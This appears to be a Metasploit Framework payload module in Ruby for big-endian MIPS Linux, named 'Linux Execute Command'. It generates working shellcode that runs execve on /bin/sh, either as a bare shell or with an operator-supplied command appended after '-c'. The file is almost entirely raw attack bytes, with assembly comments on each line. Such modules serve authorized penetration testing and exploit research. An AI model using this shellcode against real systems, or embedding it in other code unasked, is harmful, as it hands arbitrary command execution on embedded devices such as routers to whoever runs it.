# -*- coding: binary -*-

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  CachedSize = 52

  include Msf::Payload::Single
  include Msf::Payload::Linux::Mipsbe::Prepends

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name' => 'Linux Execute Command',
        'Description' => 'Execute an arbitrary command or just a /bin/sh shell',
        'Author' => [
          'Michael Messner <devnull[at]s3cur1ty.de>', # metasploit payload
          'entropy@phiral.net', # original payload
          'Diego Ledda'
        ],
        'References' => [
          ['EDB', '17940']
        ],
        'License' => MSF_LICENSE,
        'Platform' => 'linux',
        'Arch' => ARCH_MIPSBE
      )
    )

    register_options([
      OptString.new('CMD', [ false, 'The command string to execute' ]),
    ])
  end

  def generate(_opts = {})
    cmd = datastore['CMD'] || ''

    if cmd.empty?
      # execve("/bin/sh", ["/bin/sh"], NULL)
      shellcode =
        "\x24\x06\x06\x66" + # li      a2, 1638
        "\x04\xd0\xff\xff" + # bltzal  a2, myself
        "\x28\x06\xff\xff" + # slti    a2, zero, -1     (delay slot, a2 = 0)
        # myself: (ra = here)
        "\x27\xbd\xff\xe0" + # addiu   sp, sp, -32
        "\x27\xe4\x10\x01" + # addiu   a0, ra, 4097
        "\x24\x84\xf0\x1f" + # addiu   a0, a0, -4065   ; a0 = &"/bin/sh"
        "\xaf\xa4\xff\xe8" + # sw      a0, -24(sp)      ; argv[0] = &"/bin/sh"
        "\xaf\xa0\xff\xec" + # sw      zero, -20(sp)    ; argv[1] = NULL
        "\x27\xa5\xff\xe8" + # addiu   a1, sp, -24      ; a1 = argv
        "\x24\x02\x0f\xab" + # li      v0, 4011         ; __NR_execve
        "\x01\x01\x01\x0c"   # syscall 0x40404
      shellcode += "/bin/sh\x00"
    else
      # execve("/bin/sh", ["/bin/sh", "-c", CMD, NULL], NULL)
      shellcode =
        "\x24\x06\x06\x66" + # li      a2, 1638
        "\x04\xd0\xff\xff" + # bltzal  a2, myself
        "\x28\x06\xff\xff" + # slti    a2, zero, -1     (delay slot, a2 = 0)
        # myself: (ra = here)
        "\x27\xbd\xff\xe0" + # addiu   sp, sp, -32
        "\x27\xe4\x10\x01" + # addiu   a0, ra, 4097
        "\x24\x84\xf0\x37" + # addiu   a0, a0, -4041   ; a0 = &"/bin/sh"
        "\xaf\xa4\xff\xe0" + # sw      a0, -32(sp)      ; argv[0] = &"/bin/sh"
        "\x27\xe8\x10\x01" + # addiu   t0, ra, 4097
        "\x25\x08\xf0\x3f" + # addiu   t0, t0, -4033   ; t0 = &"-c"
        "\xaf\xa8\xff\xe4" + # sw      t0, -28(sp)      ; argv[1] = &"-c"
        "\x27\xe8\x10\x01" + # addiu   t0, ra, 4097
        "\x25\x08\xf0\x43" + # addiu   t0, t0, -4029   ; t0 = &CMD
        "\xaf\xa8\xff\xe8" + # sw      t0, -24(sp)      ; argv[2] = &CMD
        "\xaf\xa0\xff\xec" + # sw      zero, -20(sp)    ; argv[3] = NULL
        "\x27\xa5\xff\xe0" + # addiu   a1, sp, -32      ; a1 = argv
        "\x24\x02\x0f\xab" + # li      v0, 4011         ; __NR_execve
        "\x01\x01\x01\x0c"   # syscall 0x40404
      shellcode += "/bin/sh\x00"
      shellcode += "-c\x00\x00"
      shellcode += cmd + "\x00"
    end

    # align our shellcode to 4 bytes
    shellcode += "\x00" while shellcode.bytesize % 4 != 0

    super.to_s + shellcode
  end
end
